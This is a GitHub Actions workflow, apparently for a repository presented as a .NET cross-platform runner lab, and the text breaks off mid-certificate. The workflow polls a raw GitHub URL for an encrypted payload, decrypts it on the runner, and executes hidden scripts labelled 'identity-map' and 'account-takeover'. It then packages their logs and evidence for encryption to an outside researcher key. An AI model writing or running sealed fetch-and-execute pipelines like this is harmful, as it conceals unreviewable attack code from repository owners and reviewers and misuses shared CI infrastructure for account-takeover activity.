name: G07 isolated sealed Identity lab
on:
  push:
    branches:
      - g07-l095-pa30-e83-20261128-c73f
    paths:
      - .github/workflows/g07-l095-e92.yml

permissions:
  contents: read

jobs:
  sealed:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 11.0.x
      - name: Publish one-run receiver certificate
        shell: bash
        run: |
          set -euo pipefail
          openssl req -x509 -newkey rsa:3072 -keyout "$RUNNER_TEMP/g07-receiver-key.pem" -out "$RUNNER_TEMP/g07-receiver-cert.pem" -days 1 -nodes -subj /CN=G07-E92-Receiver >/dev/null 2>&1
          echo '=== BEGIN RECEIVER CERT ==='
          cat "$RUNNER_TEMP/g07-receiver-cert.pem"
          echo '=== END RECEIVER CERT ==='
      - name: Run sealed fixture and seal evidence
        shell: bash
        run: |
          set -euo pipefail
          sealed="$RUNNER_TEMP/g07-sealed-payload.cms"
          found=0
          for i in $(seq 1 180); do
            if curl -fsSL --max-time 15 "https://raw.githubusercontent.com/aeorauk-maker/dotnet-cross-platform-runner-lab/g07-l095-pa30-e83-20261128-c73f/g07-sealed-payload.cms?poll=$i" -o "$sealed" 2>/dev/null; then
              found=1
              break
            fi
            sleep 5
          done
          if [ "$found" -ne 1 ]; then
            echo 'Encrypted fixture did not arrive'
            exit 1
          fi
          openssl cms -decrypt -binary -inform DER -in "$sealed" -recip "$RUNNER_TEMP/g07-receiver-cert.pem" -inkey "$RUNNER_TEMP/g07-receiver-key.pem" -out "$RUNNER_TEMP/g07-source.tgz" >/dev/null 2>&1
          mkdir -p "$RUNNER_TEMP/g07-lab"
          tar -xzf "$RUNNER_TEMP/g07-source.tgz" -C "$RUNNER_TEMP/g07-lab"
          python3 -m venv "$RUNNER_TEMP/g07-venv"
          "$RUNNER_TEMP/g07-venv/bin/python" -m pip -q install playwright >/dev/null
          chrome="$(command -v google-chrome || command -v chromium || true)"
          if [ -z "$chrome" ]; then
            echo 'Chrome unavailable on hosted runner'
            exit 1
          fi
          export G07_DOTNET="$(command -v dotnet)"
          export G07_CHROME="$chrome"
          lab="$RUNNER_TEMP/g07-lab"
          mkdir -p "$lab/E83-identity-map/evidence" "$lab/E84-account-takeover/evidence"
          if "$RUNNER_TEMP/g07-venv/bin/python" "$lab/E83-identity-map/run.py" > "$RUNNER_TEMP/g07-e83-private.log" 2>&1; then
            status83=0
          else
            status83=$?
          fi
          if "$RUNNER_TEMP/g07-venv/bin/python" "$lab/E84-account-takeover/run.py" > "$RUNNER_TEMP/g07-e84-private.log" 2>&1; then
            status84=0
          else
            status84=$?
          fi
          tar -czf "$RUNNER_TEMP/g07-results.tgz" -C "$RUNNER_TEMP" g07-e83-private.log g07-e84-private.log -C "$lab" E83-identity-map/evidence E84-account-takeover/evidence
          cat > "$RUNNER_TEMP/g07-researcher-cert.pem" <<'CERT'
          -----BEGIN CERTIFICATE-----
          MIIDqjCCAhICCQDeK9EHr2K0rTANBgkqhkiG9w0BAQsFADAXMRUwEwYDVQQDDAxH
          MDctTDA5NS1FOTIwHhcNMjYxMTI4MDkyNjE4WhcNMjYxMTMwMDkyNjE4WjAXMRUw
          EwYDVQQDDAxHMDctTDA5NS1FOTIwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGK
